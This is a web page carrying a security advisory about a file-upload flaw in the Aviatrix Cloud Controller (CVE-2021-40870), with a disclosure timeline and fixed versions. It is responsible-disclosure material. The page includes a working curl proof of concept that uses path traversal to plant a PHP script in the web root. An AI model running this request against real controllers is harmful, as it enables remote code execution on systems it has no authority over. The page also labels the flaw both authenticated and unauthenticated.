<!DOCTYPE html>
<!--[if IE 8]> <html class="no-js ie lt-ie9 lt-ie10"> <![endif]-->
<!--[if IE 9]> <html class="no-js ie lt-ie10"> <![endif]-->
<!--[if gt IE 9]> ><! <![endif]-->
<html class='no-js'>
<head>
<script async src='https://www.googletagmanager.com/gtag/js?id=UA-117090100-1'></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-117090100-1');
</script>
<script async defer id='hs-script-loader' src='//js.hs-scripts.com/6858412.js' type='text/javascript'></script>
<meta charset='utf-8'>
<meta content='ie=edge' http-equiv='x-ua-compatible'>
<meta content='width=device-width, initial-scale=1, shrink-to-fit=no' name='viewport'>
<link href='/favicon.ico' rel='icon' type='image/ico'>
<link href='/apple-touch-icon.png' rel='apple-touch-icon'>
<link href='/apple-touch-icon.png' rel='apple-touch-icon' sizes='180x180' type='image/png'>
<link href='/favicon-32x32.png' rel='icon' sizes='32x32' type='image/png'>
<link href='/favicon-16x16.png' rel='icon' sizes='16x16' type='image/png'>
<link href='/site.webmanifest' rel='manifest'>
<link color='#ff5c35' href='/safari-pinned-tab.svg' rel='mask-icon'>
<meta content='#da532c' name='msapplication-TileColor'>
<meta content='#f7f7f4' name='theme-color'>
<!-- Primary Meta Tags -->
<title>Unrestricted upload of file with dangerous type in Aviatrix allows an authenticated user to execute arbitrary code — Tradecraft</title>
<meta content='Unrestricted upload of file with dangerous type in Aviatrix allows an authenticated user to execute arbitrary code — Tradecraft' name='title'>
<meta content='An authenticated user can upload arbitrary files to a web directory on an Aviatrix Cloud Controller. These files could include PHP scripts, which would allow the attacker to run code of their choosing on the host.' name='description'>
<!-- Open Graph / Facebook -->
<meta content='website' property='og:type'>
<meta content='https://www.wearetradecraft.com/advisories/tc-2021-0002/' property='og:url'>
<meta content='Unrestricted upload of file with dangerous type in Aviatrix allows an authenticated user to execute arbitrary code — Tradecraft' property='og:title'>
<meta content='An authenticated user can upload arbitrary files to a web directory on an Aviatrix Cloud Controller. These files could include PHP scripts, which would allow the attacker to run code of their choosing on the host.' property='og:description'>
<!-- Twitter -->
<meta content='summary_large_image' property='twitter:card'>
<meta content='https://www.wearetradecraft.com/advisories/tc-2021-0002/' property='twitter:url'>
<meta content='Unrestricted upload of file with dangerous type in Aviatrix allows an authenticated user to execute arbitrary code — Tradecraft' property='twitter:title'>
<meta content='An authenticated user can upload arbitrary files to a web directory on an Aviatrix Cloud Controller. These files could include PHP scripts, which would allow the attacker to run code of their choosing on the host.' property='twitter:description'>
<script src="/javascripts/jquery-3.4.1.min.js"></script>
<script src="/javascripts/application.js"></script>
<link href="/stylesheets/application.css" rel="stylesheet" />
<link href="/stylesheets/highlighting.css" rel="stylesheet" />
<!--[if IE]>
<link href="/stylesheets/ie.css" rel="stylesheet" />
<![endif]-->
</head>

<body class='advisories advisories_tc-2021-0002 advisories_tc-2021-0002_index'>
<div id='body-inner'>
<div class='tc-c-header'>
<div class='tc-c-page-section tc-c-page-section--no-margin'>
<a href="/" class="tc-c-header__logo" aria-label="Tradecraft homepage"><svg viewBox='0 0 200 36' xmlns='http://www.w3.org/2000/svg'>
<title>Tradecraft</title>
<path class='marque' d='M11,3.13A3.14,3.14,0,0,0,7.86,0H0V4H11Z'></path>
<path class='marque' d='M25.6,7.68a3.13,3.13,0,0,0,3.15,3.13h6.12v-4H25.6Z'></path>
<path class='marque' d='M18.89,9.93V36h4V6.8H22A3.13,3.13,0,0,0,18.89,9.93Z'></path>
<path class='marque' d='M0,10.79H13.69a3.13,3.13,0,0,0,3.15-3.13V6.8H0Z'></path>
<path class='marque' d='M12.93,13.4h-.86V36h4V16.54A3.13,3.13,0,0,0,12.93,13.4Z'></path>
<path class='marque' d='M13.72,0a4,4,0,0,0,4,4H34.85V0Z'></path>
<path class='type' d='M63.66,4.8V7.66H55.53V29.87H52.11V7.64H44V4.8Z'></path>
<path class='type' d='M64,29.87V12.14h1.79a.93.93,0,0,1,.7.21,1.1,1.1,0,0,1,.27.67l.21,2.77a7.69,7.69,0,0,1,2.26-2.88,5,5,0,0,1,3.14-1,6.06,6.06,0,0,1,1.33.16,4.42,4.42,0,0,1,1.11.47l-.41,2.28a.53.53,0,0,1-.54.43,2.71,2.71,0,0,1-.75-.16,4.82,4.82,0,0,0-1.42-.16,4.1,4.1,0,0,0-2.74.95,7.34,7.34,0,0,0-1.83,2.75V29.87Z'></path>
<path class='type' d='M90.49,29.87H89.11a1.83,1.83,0,0,1-.75-.13.77.77,0,0,1-.36-.59l-.36-1.64c-.48.42-.93.79-1.38,1.12a7.42,7.42,0,0,1-1.4.84A7.7,7.7,0,0,1,83.3,30a8.91,8.91,0,0,1-1.85.19,5.9,5.9,0,0,1-2-.3A4,4,0,0,1,77.94,29a4.08,4.08,0,0,1-1.06-1.46,5,5,0,0,1-.38-2.1,4,4,0,0,1,.58-2A5.24,5.24,0,0,1,79,21.67a12.64,12.64,0,0,1,3.37-1.24A23.91,23.91,0,0,1,87.44,20v-1.4a4.75,4.75,0,0,0-.89-3.13,3.23,3.23,0,0,0-2.62-1.06,5.13,5.13,0,0,0-1.92.3,7.07,7.07,0,0,0-1.35.65c-.39.25-.71.45-1,.65a1.3,1.3,0,0,1-.81.3,1.1,1.1,0,0,1-.54-.16,1.38,1.38,0,0,1-.39-.41l-.56-1a10,10,0,0,1,3.18-2.12,9.9,9.9,0,0,1,3.78-.7,6.48,6.48,0,0,1,2.64.5,5.38,5.38,0,0,1,2,1.37,5.93,5.93,0,0,1,1.19,2.12,8.54,8.54,0,0,1,.41,2.73l0,11.26ZM82.37,28a7.79,7.79,0,0,0,1.52-.16,6.41,6.41,0,0,0,1.29-.47,6.48,6.48,0,0,0,1.15-.75,13.87,13.87,0,0,0,1.08-1V21.94a21.07,21.07,0,0,0-3.66.27,10.12,10.12,0,0,0-2.46.72,3.43,3.43,0,0,0-1.38,1,2.27,2.27,0,0,0-.43,1.33,2.86,2.86,0,0,0,.23,1.22,2.27,2.27,0,0,0,.61.83,2.41,2.41,0,0,0,.9.47A4.77,4.77,0,0,0,82.37,28Z'></path>
<path class='type' d='M107.48,29.87a.8.8,0,0,1-.84-.65l-.27-2.16a9.16,9.16,0,0,1-2.6,2.2,6.53,6.53,0,0,1-3.36.84,6.62,6.62,0,0,1-2.78-.59A5.77,5.77,0,0,1,95.5,27.8,8.07,8.07,0,0,1,94.15,25a14.35,14.35,0,0,1-.48-3.9,12.63,12.63,0,0,1,.52-3.65,8.72,8.72,0,0,1,1.52-2.92,6.93,6.93,0,0,1,2.41-2,7.11,7.11,0,0,1,3.24-.7,6.24,6.24,0,0,1,2.78.56,6.66,6.66,0,0,1,2.07,1.55V4.1h3.12V29.87Zm-6.06-2.27a5,5,0,0,0,2.67-.7,7.85,7.85,0,0,0,2.12-2V16.33a4.92,4.92,0,0,0-1.89-1.62,5.48,5.48,0,0,0-2.29-.47A4.52,4.52,0,0,0,98.21,16a8.34,8.34,0,0,0-1.33,5,12.44,12.44,0,0,0,.3,3,5.46,5.46,0,0,0,.88,2,3.32,3.32,0,0,0,1.42,1.17A4.87,4.87,0,0,0,101.42,27.6Z'></path>
<path class='type' d='M120.43,11.87a7.77,7.77,0,0,1,2.94.54,6.85,6.85,0,0,1,2.32,1.53,7,7,0,0,1,1.54,2.48,9.83,9.83,0,0,1,.54,3.36,1.91,1.91,0,0,1-.15,1A.67.67,0,0,1,127,21H115.21a10,10,0,0,0,.45,2.92A6.21,6.21,0,0,0,116.81,26a4.63,4.63,0,0,0,1.77,1.24,6.09,6.09,0,0,0,2.28.4,6.7,6.7,0,0,0,2-.27,10.73,10.73,0,0,0,1.47-.58,10.42,10.42,0,0,0,1-.59,1.38,1.38,0,0,1,.7-.27.67.67,0,0,1,.59.29l.88,1.13a6.2,6.2,0,0,1-1.38,1.22,9.49,9.49,0,0,1-1.72.85,10.82,10.82,0,0,1-1.9.5,11.72,11.72,0,0,1-1.94.16,8.78,8.78,0,0,1-3.39-.64,7.26,7.26,0,0,1-2.69-1.82,8.52,8.52,0,0,1-1.76-3,11.82,11.82,0,0,1-.63-4.06,10.35,10.35,0,0,1,.56-3.47,8,8,0,0,1,1.65-2.79A7.5,7.5,0,0,1,117,12.48,9.83,9.83,0,0,1,120.43,11.87Zm.07,2.28a4.82,4.82,0,0,0-3.57,1.3,6.21,6.21,0,0,0-1.61,3.61H125a6.15,6.15,0,0,0-.29-2,4.4,4.4,0,0,0-.88-1.56,4.08,4.08,0,0,0-1.42-1A4.88,4.88,0,0,0,120.5,14.15Z'></path>
<path class='type' d='M143.68,15.3a1.28,1.28,0,0,1-.27.29.64.64,0,0,1-.4.11.93.93,0,0,1-.57-.22,4.55,4.55,0,0,0-.79-.48,8.77,8.77,0,0,0-1.15-.47,5,5,0,0,0-1.65-.22,5.36,5.36,0,0,0-2.31.47,4.45,4.45,0,0,0-1.67,1.33,6,6,0,0,0-1,2.12,10.77,10.77,0,0,0-.34,2.77,10,10,0,0,0,.37,2.86,5.77,5.77,0,0,0,1,2.09,4.76,4.76,0,0,0,1.62,1.31,5.17,5.17,0,0,0,2.15.45,5.44,5.44,0,0,0,1.87-.27,5,5,0,0,0,1.23-.61c.31-.22.58-.43.81-.61a1,1,0,0,1,.63-.27.61.61,0,0,1,.59.3l.88,1.12a6.58,6.58,0,0,1-2.89,2.07,10.37,10.37,0,0,1-3.66.66,7.94,7.94,0,0,1-3.1-.61,7,7,0,0,1-2.49-1.78,8.1,8.1,0,0,1-1.64-2.86,11.29,11.29,0,0,1-.61-3.88,11.75,11.75,0,0,1,.54-3.65,8,8,0,0,1,1.6-2.88,7.18,7.18,0,0,1,2.62-1.89,9,9,0,0,1,3.57-.68,8.45,8.45,0,0,1,3.3.61,8.27,8.27,0,0,1,2.56,1.71Z'></path>
<path class='type' d='M148,29.87V12.14h1.79a.93.93,0,0,1,.7.21,1.1,1.1,0,0,1,.27.67l.21,2.77a7.69,7.69,0,0,1,2.26-2.88,5,5,0,0,1,3.14-1,6.06,6.06,0,0,1,1.33.16,4.42,4.42,0,0,1,1.11.47l-.41,2.28a.53.53,0,0,1-.54.43,2.71,2.71,0,0,1-.75-.16,4.82,4.82,0,0,0-1.42-.16,4.1,4.1,0,0,0-2.74.95,7.34,7.34,0,0,0-1.83,2.75V29.87Z'></path>
<path class='type' d='M174.26,29.87h-1.38a1.82,1.82,0,0,1-.74-.13.75.75,0,0,1-.37-.59l-.36-1.64A16.56,16.56,0,0,1,170,28.63a7.42,7.42,0,0,1-1.4.84,7.31,7.31,0,0,1-1.56.51,8.77,8.77,0,0,1-1.85.19,5.84,5.84,0,0,1-1.94-.3,4,4,0,0,1-1.56-.88,4.08,4.08,0,0,1-1.06-1.46,4.83,4.83,0,0,1-.39-2.1,3.9,3.9,0,0,1,.59-2,5.2,5.2,0,0,1,1.87-1.74,12.64,12.64,0,0,1,3.37-1.24,24,24,0,0,1,5.11-.47v-1.4a4.75,4.75,0,0,0-.88-3.13,3.25,3.25,0,0,0-2.62-1.06,5.13,5.13,0,0,0-1.92.3,7.18,7.18,0,0,0-1.36.65c-.38.25-.7.45-1,.65a1.3,1.3,0,0,1-.82.3,1.1,1.1,0,0,1-.54-.16,1.34,1.34,0,0,1-.38-.41l-.57-1a10,10,0,0,1,3.19-2.12,9.74,9.74,0,0,1,3.77-.7,6.49,6.49,0,0,1,2.65.5,5.34,5.34,0,0,1,1.94,1.37,6,6,0,0,1,1.2,2.12,8.83,8.83,0,0,1,.41,2.73l-.05,11.26ZM166.15,28a7.77,7.77,0,0,0,1.51-.16,6.41,6.41,0,0,0,1.29-.47,6.14,6.14,0,0,0,1.15-.75c.36-.29.72-.63,1.09-1V21.94a20.91,20.91,0,0,0-3.66.27,10.21,10.21,0,0,0-2.47.72,3.5,3.5,0,0,0-1.38,1,2.27,2.27,0,0,0-.43,1.33,2.86,2.86,0,0,0,.23,1.22,2.39,2.39,0,0,0,.61.83,2.29,2.29,0,0,0,.9.47A4.85,4.85,0,0,0,166.15,28Z'></path>
<path class='type' d='M178.73,29.87V14.8l-2-.22a2,2,0,0,1-.61-.27.63.63,0,0,1-.23-.55V12.48h2.8V10.77a7.73,7.73,0,0,1,.43-2.7,6,6,0,0,1,1.22-2,5.06,5.06,0,0,1,1.93-1.24,7.32,7.32,0,0,1,2.53-.43,6.61,6.61,0,0,1,2.21.36L187,6.31a.43.43,0,0,1-.29.43,4,4,0,0,1-.79.06h-.54a4.83,4.83,0,0,0-1.47.21,2.7,2.7,0,0,0-1.13.67A2.92,2.92,0,0,0,182,8.92a6,6,0,0,0-.24,1.92v1.62h5.15v2.25h-5V29.87Z'></path>
<path class='type' d='M195.71,30.14A4.26,4.26,0,0,1,192.47,29a4.75,4.75,0,0,1-1.13-3.38V14.76H189.2a.89.89,0,0,1-.48-.16.66.66,0,0,1-.2-.52V12.84l2.92-.36L192.16,7a.62.62,0,0,1,.22-.43.77.77,0,0,1,.5-.16h1.58v6.11h5.09v2.25h-5.09V25.41a2.24,2.24,0,0,0,.55,1.67,1.9,1.9,0,0,0,1.4.54,2.58,2.58,0,0,0,.86-.14,3.71,3.71,0,0,0,.63-.29l.45-.29a.55.55,0,0,1,.32-.14.51.51,0,0,1,.43.3l.9,1.48a5.75,5.75,0,0,1-1.94,1.17A6.42,6.42,0,0,1,195.71,30.14Z'></path>
</svg>

</a><div class='tc-c-header__nav tc-js-main-nav'>
<div class='tc-c-main-nav-overlay tc-js-main-nav-overlay'></div>
<nav class='tc-c-main-nav' role='navigation'>
<a class='tc-c-main-nav__toggle-btn tc-js-toggle-nav' href='#' role='button'>
<!--[if gte IE 9]> ><! <![endif]-->
<svg viewBox='0 0 20 15' xmlns='http://www.w3.org/2000/svg'>
<title>Menu</title>
<path class='burger-top' d='M0,0c0,1.7,1.4,3,3,3h17V0H0z'></path>
<path class='burger-middle' d='M0,6c0,1.7,1.4,3,3,3h17V6H0z'></path>
<path class='burger-bottom' d='M0,12c0,1.7,1.4,3,3,3h17v-3H0z'></path>
</svg>

<!-- <![endif] -->
</a>
<nav class='tc-c-main-nav__items tc-js-main-nav-items'>
<a href="/">Home</a>
<a href="/services">Services</a>
<a href="/jobs">Jobs</a>
<a href="/contact-us">Contact us</a>
<a href="https://medium.com/tradecraft">Blog</a>
</nav>
</nav>
</div>
</div>
</div>

<div class='tc-c-hero tc-c-hero--no-margin'>
<div class='tc-c-hero__container'>
<h1 class='tc-c-hero__title'>
Advisory
</h1>
<h2 class='tc-c-hero__subtitle'>
Unrestricted upload of file with dangerous type in Aviatrix allows an authenticated user to execute arbitrary code
</h2>
</div>
</div>
<div class='tc-c-page-section'>
<div class='tc-c-content-grid'>
<div class='tc-c-content-grid__body tc-c-content-grid__body--with-hr'>
<div class='tc-c-styled-content'>
<h2 id="overview">Overview</h2>

<p>While the Aviatrix UI requires authentication, many API calls do not enforce a check for authentication. Some of these API calls allow an unauthenticated attacker to upload arbitrary files, including <code>.php</code> scripts, to the filesystem. These uploaded scripts will be processed by the web frontend, allowing an attacker to run code of their choosing.</p>

<h2 id="proof-of-concept">Proof of concept</h2>

<ol>
  <li>Make the following request to the Aviatrix Cloud Controller <code>aviatrix</code>:</li>
</ol>

<div class="highlight"><pre class="highlight plaintext"><code>curl -k https://aviatrix.domain.tld/v1/backend1 -d CID=x -d action=set_metric_gw_selections -d account_name=/../../../var/www/php/test.php -d 'data=hello&lt;?php phpinfo()?&gt;'
</code></pre></div>
<ol start="2">
  <li>Visit <code>https://aviatrix.domain.tld/v1/test</code>. This will show the PHP Version page.</li>
</ol>

<h2 id="mitigationfurther-actions">Mitigation/further actions</h2>

<p>Upgrade to one of the following versions:</p>

<ul>
  <li>UserConnect-6.2-1804.2043 or later</li>
  <li>UserConnect-6.3-1804.2490 or later</li>
  <li>UserConnect-6.4-1804.2838 or later</li>
  <li>UserConnect-6.5-1804.1922 or later</li>
</ul>

<h2 id="advisory-timeline">Advisory timeline</h2>

<ol>
  <li>2021-05-12: Discovered</li>
  <li>2021-08-24: Reported to Aviatrix security team</li>
  <li>2021-08-26: Aviatrix security team confirm vulnerability will be fixed in forthcoming release</li>
  <li>2021-09-11: Fix released</li>
  <li>2021-09-12: CVE requested</li>
  <li>2021-09-13: CVE allocated</li>
</ol>


</div>
</div>
<div class='tc-c-content-grid__meta'>
<div class='tc-c-meta-breakout'>
<h3 class='tc-c-meta-breakout__title'>
CVSS
</h3>
<div class='tc-c-meta-breakout__body'>
<table class='tc-c-cvss-table'>
<tr>
<th class='base'>Base score</th>
<td class='Critical base'>10.0</td>
</tr>
<tr>
<th class='av'>Attack vector</th>
<td class='N av'>Network</td>
</tr>
<tr>
<th class='ac'>Attack complexity</th>
<td class='L ac'>Low</td>
</tr>
<tr>
<th class='pr'>Privileges required</th>
<td class='N pr'>None</td>
</tr>
<tr>
<th class='ui'>User interaction</th>
<td class='N ui'>None</td>
</tr>
<tr>
<th class='sc'>Scope</th>
<td class='C sc'>Changed</td>
</tr>
<tr>
<th class='ci'>Confidentiality</th>
<td class='H ci'>High</td>
</tr>
<tr>
<th class='ii'>Integrity</th>
<td class='H ii'>High</td>
</tr>
<tr>
<th class='ai'>Availability</th>
<td class='H ai'>High</td>
</tr>
</table>
</div>
<h3 class='tc-c-meta-breakout__title'>
Metadata
</h3>
<div class='tc-c-meta-breakout__body'>
<ul class='tc-c-meta-breakout__list'>
<li>
<strong>Severity</strong>
<br>
Critical
(base score 10.0)
</li>
<li>
<strong>Discovered by</strong>
<br>
Mark Steward
</li>
<li>
<strong>Severity</strong>
<br>
High
</li>
<li>
<strong>Advisory ID</strong>
<br>
tc-2021-0002
</li>
<li>
<strong>CVE</strong>
<br>
CVE-2021-40870
</li>
<li>
<strong>Component/package</strong>
<br>
<a href='https://aviatrix.com/' target='_new'>Cloud Controller</a>
</li>
<li>
<strong>Version</strong>
<br>
050120 (2020-08-17, R6.1.1280)
</li>
<li>
<strong>Published</strong>
<br>
2021-08-24
</li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
<script type='application/ld+json'>
{
"@context" : "http://schema.org",
"@type" : "LocalBusiness",
"name" : "Tradecraft",
"image" : "https://www.wearetradecraft.com/images/tradecraft-logo.svg",
"telephone" : "0345 257 7520",
"email" : "hello@wearetradecraft.com",
"address" : {
"@type" : "PostalAddress",
"streetAddress" : "86-90 Paul Street",
"addressLocality" : "London",
"postalCode" : "EC2A 4NE"
}
}
</script>
<div class='tc-h-bg-very-black'>
<div class='tc-c-page-section tc-c-page-section--no-margin'>
<div class='tc-c-footer'>
<p>
<small>
&copy; 2022 Tradecraft Ltd. Tradecraft Ltd is a company registered in England & Wales, no. 10984430. Registered address 86-90 Paul Street, London, EC2A 4NE.
</small>
</p>
<p>
<small>
<a href='/privacy'>Privacy policy</a>
<span>/</span>
<a href='/code-of-conduct'>Events code of conduct</a>
<span>/</span>
<a href='/responsible-disclosure'>Responsible disclosure</a>
</small>
</p>
</div>
</div>
</div>

</body>
</html>
